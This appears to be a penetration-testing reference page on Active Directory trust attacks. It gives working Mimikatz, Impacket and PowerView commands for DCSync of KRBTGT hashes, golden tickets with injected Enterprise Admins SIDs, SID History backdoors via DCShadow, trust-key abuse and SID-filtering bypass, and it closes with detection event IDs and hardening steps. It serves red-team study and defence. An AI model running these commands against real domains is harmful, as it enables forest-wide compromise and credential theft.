---
title: Active Directory Trust Attacks
category: techniques
subcategory: active-directory
tags: [trusts, forest-trust, domain-trust, sid-history, cross-forest]
last_updated: 2025-12-27
---

# Active Directory Trust Attacks

## Table of Contents

- [Overview](#overview)
- [Trust Types](#trust-types)
- [Trust Enumeration](#trust-enumeration)
- [Child-to-Parent Domain Escalation](#child-to-parent-domain-escalation)
- [SID History Injection](#sid-history-injection)
- [Forest Trust Abuse](#forest-trust-abuse)
- [SID Filtering Bypass](#sid-filtering-bypass)
- [Detection and Defense](#detection-and-defense)
- [References](#references)

## Overview

Active Directory trusts allow authentication and access across domains and forests. Trusts can be exploited to escalate privileges from one domain to another or from a child domain to the entire forest.

**Key Concepts:**
- **Domain Trust**: Between domains in the same or different forests
- **Forest Trust**: Between forests
- **SID Filtering**: Security boundary preventing SID injection
- **SID History**: Attribute preserving SIDs during migrations

---

## Trust Types

### Trust Directions

| Direction | Description |
|-----------|-------------|
| One-Way Incoming | Trusted domain can access trusting domain |
| One-Way Outgoing | Trusting domain can access trusted domain |
| Two-Way | Mutual access between domains |

### Trust Types

| Type | Description | SID Filtering |
|------|-------------|---------------|
| Parent-Child | Automatic, two-way, transitive | Disabled (same forest) |
| Tree-Root | Between forest root and tree root | Disabled (same forest) |
| External | Between domains in different forests | Enabled by default |
| Forest | Between forest root domains | Enabled by default |
| Shortcut | Optimizes authentication in complex forests | Inherits from parent |

---

## Trust Enumeration

### PowerView

```powershell
# Get domain trusts
Get-DomainTrust

# Get forest trusts
Get-ForestTrust

# Map all trusts
Get-DomainTrustMapping

# Trust details
Get-DomainTrust -Domain child.domain.local

# Check SID filtering status
Get-DomainTrust | select SourceName, TargetName, TrustAttributes
# Look for FILTER_SIDS attribute
```

### Impacket / LDAP

```bash
# Enumerate trusts
GetADUsers.py domain.local/user:password -dc-ip DC_IP -all

# LDAP query for trusts
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w 'password' \
  -b "CN=System,DC=domain,DC=local" "(objectClass=trustedDomain)"
```

### BloodHound

```cypher
# Find all trusts
MATCH (d:Domain)-[r:TrustedBy]->(t:Domain)
RETURN d.name, r, t.name

# Find domains trusted by forest root
MATCH p=(d:Domain {name:"FOREST.LOCAL"})-[:TrustedBy*1..]->(t:Domain)
RETURN p
```

---

## Child-to-Parent Domain Escalation

### Description

In a forest, child domains automatically have a two-way transitive trust with their parent. SID filtering is disabled within the same forest, allowing escalation to Enterprise Admin.

### Requirements

- Domain Admin in child domain
- KRBTGT hash of child domain
- SID of parent domain Enterprise Admins group

### Exploitation

**Step 1: Get Child Domain KRBTGT Hash**
```bash
# DCSync from child domain
secretsdump.py child.domain.local/admin:password@CHILD_DC -just-dc-user krbtgt
```

**Step 2: Get Parent Domain SID**
```powershell
# Get parent domain SID
Get-DomainSID -Domain parent.domain.local
# S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx

# Enterprise Admins RID is 519
# Full SID: S-1-5-21-parent-519
```

**Step 3: Create Golden Ticket with SID History**
```
# Mimikatz - Inter-realm TGT
kerberos::golden /user:Administrator /domain:child.domain.local /sid:S-1-5-21-child /krbtgt:CHILD_KRBTGT_HASH /sids:S-1-5-21-parent-519 /ptt

# /sids: adds Enterprise Admins SID to SID History
```

```bash
# Impacket
ticketer.py -nthash CHILD_KRBTGT_HASH -domain-sid S-1-5-21-child -domain child.domain.local -extra-sid S-1-5-21-parent-519 Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass child.domain.local/Administrator@PARENT_DC
```

### Access Parent Domain

```bash
# DCSync parent domain
secretsdump.py -k -no-pass parent.domain.local/Administrator@PARENT_DC

# Get parent KRBTGT for full forest persistence
```

---

## SID History Injection

### Description

SID History is designed to preserve access during domain migrations. It can be abused to inject privileged SIDs, granting unauthorized access.

### Within Same Forest (No SID Filtering)

```
# Mimikatz - Add SID to user's SID History
privilege::debug
sid::add /sam:backdoor /new:S-1-5-21-xxx-512

# Or using DCShadow
lsadump::dcshadow /object:backdoor /attribute:SIDHistory /value:S-1-5-21-xxx-512
lsadump::dcshadow /push
```

### Via Golden Ticket

```
# Add SID History via /sids parameter
kerberos::golden /user:attacker /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /sids:S-1-5-21-other-domain-512 /ptt
```

### Common SIDs to Inject

| SID | Description |
|-----|-------------|
| S-1-5-21-domain-512 | Domain Admins |
| S-1-5-21-domain-519 | Enterprise Admins |
| S-1-5-21-domain-518 | Schema Admins |
| S-1-5-9 | Enterprise Domain Controllers |

---

## Forest Trust Abuse

### Description

Forest trusts typically have SID filtering enabled, limiting what SIDs are trusted. However, there are still attack paths.

### SID Filtering Limitations

With SID filtering enabled:
- SIDs from the trusted domain work normally
- SIDs from other domains are removed
- SIDs with RID < 1000 are filtered (well-known SIDs)
- SIDs with RID >= 1000 may pass (custom groups)

### Exploiting Weak SID Filtering

```powershell
# Check if SID filtering is disabled (quarantine)
Get-DomainTrust | select TargetName, TrustAttributes

# TREAT_AS_EXTERNAL means SID filtering is partially disabled
# FILTER_SIDS is enabled = filtering active
```

### Kerberos Trust Ticket Attacks

**If you have the trust key:**
```
# Get trust key from child DC
lsadump::trust /patch

# Or via DCSync
lsadump::dcsync /user:PARENT$

# Create inter-realm TGT
kerberos::golden /user:Administrator /domain:child.domain.local /sid:S-1-5-21-child /rc4:TRUST_KEY /service:krbtgt /target:parent.domain.local /ticket:trust.kirbi
```

### Access Trusted Forest Resources

```bash
# If you have valid credentials in trusted forest
# Or if trust allows specific access

# Enumerate accessible resources
netexec smb TRUSTED_FOREST_DCS -u user -p password -d TRUSTED_FOREST

# Access shared resources
smbclient.py TRUSTED_FOREST/user:password@TARGET
```

---

## SID Filtering Bypass

### Description

SID filtering blocks many attacks, but there are bypass techniques depending on configuration.

### Partial Filtering (RID >= 1000)

```
# If SID filtering allows RID >= 1000
# Find high-privilege groups with RID >= 1000

# Inject that SID instead of Domain Admins (RID 512)
kerberos::golden /user:attacker /domain:trusted.local /sid:S-1-5-21-xxx /krbtgt:HASH /sids:S-1-5-21-target-1234 /ptt
```

### TREAT_AS_EXTERNAL Flag

If trust has `TREAT_AS_EXTERNAL` attribute:
- Behaves like external trust
- Less restrictive filtering in some cases

### Foreign Principal Access

```powershell
# Check for foreign principals in local groups
Get-DomainForeignGroupMember -Domain domain.local

# Access via legitimate trust path
# If user from trusted domain is in local privileged groups
```

---

## Trust Attack Scenarios

### Scenario 1: Child Domain to Enterprise Admin

```
1. Compromise child domain (get Domain Admin)
2. DCSync child domain KRBTGT
3. Get parent domain SID
4. Create Golden Ticket with /sids:S-1-5-21-parent-519
5. Access parent DC
6. DCSync parent domain
7. Full forest compromise
```

### Scenario 2: External Trust with Weak Filtering

```
1. Compromise trusted domain
2. Enumerate trust attributes (check filtering)
3. If filtering disabled or weak:
   - Create ticket with target domain SID
   - Access target resources
4. If filtering enabled:
   - Look for RID >= 1000 privileged groups
   - Enumerate foreign principals
```

### Scenario 3: One-Way Trust Abuse

```
1. Compromise trusting domain (user can access trusted domain)
2. If you need to go the other way:
   - Printer Bug / PetitPotam to trigger auth
   - Relay if possible
   - Password reuse across domains
```

---

## Detection and Defense

### Detection

| Attack | Detection Method |
|--------|------------------|
| SID History Injection | Monitor sIDHistory changes, Event ID 4765 |
| Inter-realm TGT | Event ID 4769 with cross-domain tickets |
| Trust Key Abuse | Monitor trust object modifications |
| Cross-Forest Access | Monitor Event ID 4624 from foreign domains |

### Key Event IDs

| Event ID | Description |
|----------|-------------|
| 4765 | SID History added to account |
| 4766 | Failed attempt to add SID History |
| 4769 | Kerberos service ticket requested (cross-domain) |
| 4770 | Kerberos ticket renewed |

### Defensive Measures

**SID Filtering:**
```powershell
# Enable SID filtering on external/forest trusts
netdom trust TRUSTED_DOMAIN /domain:TRUSTING_DOMAIN /quarantine:yes

# Verify status
netdom trust TRUSTED_DOMAIN /domain:TRUSTING_DOMAIN /quarantine
```

**Monitor SID History:**
```powershell
# Audit accounts with SID History
Get-ADUser -Filter {sIDHistory -like "*"} -Properties sIDHistory

# Alert on SID History modifications
# Event ID 4765
```

**Trust Hardening:**
- Use selective authentication on trusts
- Minimize trust relationships
- Implement trust monitoring
- Regularly audit trust configurations
- Use one-way trusts where possible

**Forest Security:**
- Consider forest as security boundary, not domain
- Protect forest root domain rigorously
- Reset KRBTGT regularly in all domains
- Use Protected Users group

**Monitoring:**
```powershell
# Monitor for foreign principals
Get-ADGroup -Filter * -Properties Members |
  Where-Object {$_.Members -like "*,CN=ForeignSecurityPrincipals,*"}
```

---

## References

- [MITRE ATT&CK - SID History Injection](https://attack.mitre.org/techniques/T1134/005/)
- [HackTricks - SID History Injection](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/sid-history-injection)
- [The Hacker Recipes - Trust Attacks](https://www.thehacker.recipes/ad/movement/trusts/)
- [Microsoft - SID Filtering](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-unsecure-sid-history-attribute)
- [adsecurity.org - Trust Attacks](https://adsecurity.org/)
- [BorderGate - SID History Abuse](https://www.bordergate.co.uk/sid-history-abuse/)
